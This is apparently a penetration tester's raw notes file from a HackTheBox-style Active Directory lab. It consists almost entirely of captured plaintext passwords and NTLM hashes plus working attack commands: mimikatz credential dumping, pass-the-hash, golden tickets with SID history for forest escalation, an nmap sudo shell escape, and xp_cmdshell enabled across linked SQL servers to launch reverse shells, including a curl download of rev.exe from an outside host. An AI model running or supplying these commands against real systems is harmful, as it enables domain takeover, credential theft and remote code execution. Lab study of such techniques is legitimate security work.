
riley : P@ssw0rd
web_svc : !QAZ1qaz
blake : Password123!
daniel :
matt :
James : 8af1903d3c80d3552a84b6ba296db2ea
svrsvc$ : 6ee87fa6593a4798fe651f5f5a4e663e
$SecPassword = ConvertTo-SecureString '!QAZ2wsx' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('zsm\marcus', $SecPassword)
svcbpa admin : 23ea5ff648e7ec7dcd1bfef8e9434099
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache""sekurlsa::ekeys" "exit"

painters dc admin : 5bdd6a33efe43f0dc7e3b2435579aa53 krbtgt b59ffc1f7fcd615577dab8436d3988fc
4103
4601

kerberos::golden /user:administrator /domain:painters.htb /sid:S-1-5-21-1470357062-2280927533-300823338 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-2734290894-461713716-141835440-4601 /ptt

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force;Set-DomainUserPassword -Identity "Jamie" -AccountPassword $UserPassword -domain zsm.local -credential $cred

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo /usr/bin/nmap --script=$TF
```

marcus : !QAZ2wsx

ZPH-SVRMGMT1$ : 44892d1f6cd79eb76b8aa172d0039b97

sekurlsa::pth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe
sekurlsa::pth /user:'ZPH-SVRMGMT1$' /domain:zsm.local /ntlm:44892d1f6cd79eb76b8aa172d0039b97 /run:cmd.exe

Add-DomainGroupMember -Identity 'CN=CA Managers,CN=Builtin,DC=zsm,DC=local' -Members 'CN=Marcus Thompson,OU=Users,OU=Zephyr,OU=Sites,DC=zsm,DC=local' -domain zsm.local -credential $cred

sekurlsa::pth /user:"ZPH-SVRMGMT1$" /domain:zsm.local /ntlm:44892d1f6cd79eb76b8aa172d0039b97 /run:"powershell c:\rev.ps1" 

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('zsm\jamie', $SecPassword)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035::: mgmt1 admin hash

Get-DomainComputer $TargetComputer -credential $cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -credential $cred
administrator hash f027f0fcf9a7470a9276a6484eb336f9 ca machine

Get-SQLQuery -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
Get-SQLQuery -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXECUTE AS LOGIN = 'sa';EXEC xp_cmdshell 'powershell c:\windows\tasks\rev.ps1';"

Get-SQLQuery -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXECUTE AS LOGIN = 'sa';select * from openquery(""ZSM-SVRCSQL02.internal.zsm.local"", 'select @@version as version')"

'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "ZSM-SVRCSQL02"'

sql01 Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ac325190bb999ef4ad73b0b67e8e33c:::

Get-SQLQuery -instance zph-svrsql01.zsm.local -verbose -Query 'EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT ZSM-SVRCSQL02.internal.zsm.local'
Get-SQLQuery -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXECUTE AS LOGIN = 'sa';EXEC master..sp_addsrvrolemember @loginame = N'zabbix', @rolename = N'sysadmin'"

  
Get-SQLServerLinkCrawl -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "ZSM-SVRCSQL02.internal.zsm.local"'

Get-SQLServerLinkCrawl -instance zph-svrsql01 -username zabbix -p rDhHbBEfh35sMbkY -verbose -Query "exec master..xp_cmdshell 'whoami'"

Get-SQLServerLinkCrawl -instance zph-svrsql01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

Get-SQLServerLinkCrawl -instance localhost -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

Get-SQLServerLinkCrawl -Instance ZPH-SVRSQL01.zsm.local -Query "EXEC master..xp_cmdshell 'whoami'" -username zabbix -password rDhHbBEfh35sMbkY -Verbose

Get-SQLQuery -instance ZPH-SVRSQL01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -Query "select * from openquery(""ZSM-SVRCSQL02.internal.zsm.local"", 'EXEC master..xp_cmdshell whoami)"

Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -Query 'SELECT * FROM OPENQUERY("ZSM-SVRCSQL02.internal.zsm.local", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'

EXEC master..sp_addsrvrolemember @loginame = N'zabbix', @rolename = N'sysadmin'

Get-SQLquery -instance ZSM-SVRCSQL02.internal.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -verbose -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

Get-SQLQuery -instance ZPH-SVRSQL01.zsm.local -username zabbix -p rDhHbBEfh35sMbkY -query "select * from openquery(""ZSM-SVRCSQL02.internal.zsm.local"", 'select * from information_schema.tables')"

```sql
Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('EXEC sp_configure ''show advanced options'', 1') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose
Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('RECONFIGURE') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose
Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose
Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('RECONFIGURE') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose
Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('EXEC master..xp_cmdshell ''whoami''') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose
```
sql02 Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c::: 172.168.210.19
mssql_svc/aron 8cb21ab7f3ee6d782c724216bd88d1d1
6522c8bfd8716727907dacfd0402049b ZSM-SVRCSQL02$

1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.210.17",$_)) "Port $_ is open!"} 2>$null

Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('EXEC master..xp_cmdshell ''c:\windows\tasks\rev.exe''') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose

Administrator:500:aad3b435b51404eeaad3b435b51404ee:724cf89458d481e0975359f3e4cf570c::: hr ZPH-SVRCHR

dpapi::chrome /in:"C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data"

melissa : WinterIsHere2022!
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5b237ae04d61a2a1644c3bcc2d4be276::: sup
$SecPassword = ConvertTo-SecureString 'WinterIsHere2022!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('internal\melissa', $SecPassword)

dc internal Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::

mimikatz.exe "kerberos::golden /user:administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /krbtgt:0540fe51ddd618f42a66ef059ac36441 /sids:S-1-5-21-2734290894-461713716-141835440-519 /ptt" "exit"

dir \\ZPH-SVRDC01.ZSM.LOCAL\c$

```
Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /rc4:502af4d8b4e0ad1f0f21e6f31e5b6f59 /service:krbtgt /target:zsm.local /ticket:c:\test.kirbi
rubeus.exe asktgs /ticket:c:\ticket.kirbi /service:HTTP/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.ZSM.LOCAL /ptt
```

mimikatz.exe "Kerberos::golden /user:Administrator /domain:INTERNAL.ZSM.LOCAL /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:502af4d8b4e0ad1f0f21e6f31e5b6f59 /service:krbtgt /target:ZSM.LOCAL" "exit"

zsm dc admin 84210eddc5724a7801fe78289ee94d44

Get-SQLQuery -Instance ZPH-SVRSQL01.zsm.local -Query "EXECUTE AS LOGIN = 'sa'; EXECUTE('EXEC master..xp_cmdshell ''powershell curl 10.10.14.9/rev.exe -o c:\windows\tasks\rev.exe''') at [ZSM-SVRCSQL02];" -username zabbix -password rDhHbBEfh35sMbkY -Verbose